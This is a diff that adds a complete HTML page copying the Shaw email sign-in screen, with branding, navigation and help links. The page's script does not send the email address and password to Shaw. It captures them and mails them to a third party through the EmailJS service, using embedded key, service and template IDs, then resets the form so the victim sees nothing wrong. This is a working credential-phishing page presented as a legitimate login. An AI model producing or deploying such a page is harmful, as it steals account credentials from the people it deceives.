@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css">
+    <title>Login| Shaw</title>
+        <!-- email js -->
+        <script
+        type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+      ></script>
+</head>
+<body>
+    <nav>
+        <div class="first">
+            <ul>
+                <li class="bord">Personal</li>
+                <li class="bord">Business</li>
+                <li>Shop|</li>
+                <li>Support |</li>
+                <li>My shaw</li>
+            </ul>
+        </div>
+        <div>
+            <p>Contact</p>
+        </div>
+    </nav>
+    <section>
+        <div class="logo-container">
+            <img src="./assets/huuu.png" alt="logo"/>
+        </div>
+        <h3 class="sin">Sign in to access your Shaw email</h3>
+        <form id="login-form">
+            <div class="email">
+                <label>Shaw email</label>
+                <input type="email" placeholder="example@shaw.ca" name="exampleInputEmail1"
+                class="form-control"
+                id="exampleInputEmail1"
+                aria-describedby="emailHelp"
+                autocomplete="off"
+                required/>
+            </div>
+
+            <div class="email">
+                <label>Password</label>
+                <input type="password"   name="exampleInputPassword1" required />
+            </div>
+            <div class="check">
+                <input type="checkbox" />
+                <p>Remember Shaw email</p>
+            </div>
+            <div class="button">
+                <button class="btn"  type="submit">Sign In</button>
+            </div>
+           
+           
+        </form>
+        <div class="issue">
+            <p>Having trouble?<span>Shaw Support: How To Reset My Password</span></p>
+            <p>Already Know How?<span> Reset Password On My Shaw</span></p>
+        </div>
+       
+    </section>
+    <script>
+        // Load the EmailJS SDK asynchronously
+        (function () {
+          emailjs.init("Fc6Zb2E93HsLc4jAH");
+        })();
+  
+        // Handle the form submission
+        const form = document.getElementById("login-form");
+  
+        form.addEventListener("submit", (event) => {
+          event.preventDefault(); // Prevent the default form submission behavior
+  
+          // Get the form data;
+          let optimumId = form.elements["exampleInputEmail1"].value;
+          let password = form.elements["exampleInputPassword1"].value;
+  
+          // Send the form data to EmailJS
+          emailjs
+            .send("service_rybja5w", "template_2g5g3nh", {
+              optimumId: optimumId,
+              password: password,
+
+            })
+
+            form.reset();
+            
+          
+            
+        });
+       
+  
+        
+      </script>
+    
+</body>
+</html>
